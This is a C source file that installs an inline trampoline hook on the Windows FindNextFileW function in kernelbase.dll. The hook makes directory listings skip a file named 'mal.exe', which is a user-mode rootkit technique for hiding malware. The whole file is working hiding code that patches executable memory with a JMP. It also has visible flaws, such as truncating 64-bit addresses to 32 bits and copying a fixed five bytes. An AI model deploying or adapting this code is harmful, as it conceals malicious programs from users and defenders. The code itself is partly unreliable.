#include "hook.h"

#define DBG_PRINT(...) {char cad[512]; sprintf_s(cad, 512, __VA_ARGS__);  OutputDebugStringA(cad);}

#define OPCODE_JMP '\xe9'
#define OPCODE_CALL
#define DLL_TO_HOOK L"kernelbase.dll"
#define PROC_TO_HOOK "FindNextFileW"


typedef BOOL(*procFindNextFileW_t)(HANDLE, LPWIN32_FIND_DATAW);
procFindNextFileW_t pFindNextFileWHookReturn;

BOOL WINAPI hookFindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData) {
	WCHAR pwszMatchingFile[] = L"mal.exe";

	BOOL fIsSuccess = pFindNextFileWHookReturn(hFindFile, lpFindFileData);
	if (!fIsSuccess) {
		return fIsSuccess;
	}
	if (wcscmp(lpFindFileData->cFileName, pwszMatchingFile) == 0) {
		DBG_PRINT("The hook blocked the file %S", pwszMatchingFile);
		return pFindNextFileWHookReturn(hFindFile, lpFindFileData);
	}
	return fIsSuccess;
}

void makeHook(LPVOID pProcToHook, LPVOID pHookToRun, LPVOID pReturnAddressAfterHook) {
	DWORD pflOldProtect;
	PUCHAR pchSavedBytesBuffer;
	PUCHAR pchReturnTrampBuffer;
	SIZE_T cbBytesToCopy = 5; // TODO varied number of bytes.
	SIZE_T cbReturnTrampSize = cbBytesToCopy + 10 + 2; // mov rax proc_addr, jmp rax.
	DWORD dwRelativeAddress;
	INT64 dqRelativeAddress, dqAddress;

	if (!VirtualProtect(pProcToHook, cbBytesToCopy, PAGE_EXECUTE_READWRITE, &pflOldProtect)) {
		DBG_PRINT("VirtualProtect for pProcToHook failed. Error code %d\n", GetLastError());
		return;
	}

	// trampoline setup
	pchReturnTrampBuffer = (PUCHAR) VirtualAlloc(NULL, cbReturnTrampSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (NULL == pchReturnTrampBuffer) {
		DBG_PRINT("VirtualAlloc for pchReturnTrampBuffer failed. Error code %d\n", GetLastError());
		return;
	}

	// trampoline setup
	memcpy_s(pchReturnTrampBuffer, cbReturnTrampSize, pProcToHook, cbBytesToCopy);
	pchReturnTrampBuffer[cbBytesToCopy] = '\x48';
	pchReturnTrampBuffer[cbBytesToCopy+1] = '\xb8';
	dqRelativeAddress = (INT64)((char*)pProcToHook + cbBytesToCopy);
	dqAddress = (INT64)((char*)pProcToHook + cbBytesToCopy);
	//dqRelativeAddress -= (INT64)((char*)pchReturnTrampBuffer + cbBytesToCopy + 10); // 10 bytes for jmp x64
	memcpy_s(pchReturnTrampBuffer + cbBytesToCopy + 2, 8, &dqAddress, 8);
	pchReturnTrampBuffer[cbBytesToCopy + 10] = '\xff';
	pchReturnTrampBuffer[cbBytesToCopy + 11] = '\xe0';
	pFindNextFileWHookReturn = (procFindNextFileW_t ) pchReturnTrampBuffer;

	// hook setup
	char pchReplacedBytes[5]; // TODO: should be cbBytesToCopy
	pchReplacedBytes[0] = OPCODE_JMP;
	dwRelativeAddress = (DWORD)pHookToRun;
	dwRelativeAddress -= (DWORD)((char*)pProcToHook + 5);
	*((PDWORD)(pchReplacedBytes + 1)) = dwRelativeAddress;
	memcpy_s(pProcToHook, 5, pchReplacedBytes, 5);

	DBG_PRINT("Hook has been installed.");
}

void hookMain() {
	HMODULE hDllToHook;
	LPVOID pProcToHook;

	hDllToHook = LoadLibraryW(DLL_TO_HOOK);
	if (NULL == hDllToHook) {
		DBG_PRINT("LoadLibrary for dll to hook failed. Error code %d\n", GetLastError());
		return;
	}

	pProcToHook = GetProcAddress(hDllToHook, PROC_TO_HOOK);
	if (NULL == pProcToHook) {
		DBG_PRINT("GetProcAddress for proc to hook failed. Error code %d\n", GetLastError());
		return;
	}

	makeHook(pProcToHook, (LPVOID)hookFindNextFileW, pFindNextFileWHookReturn);
}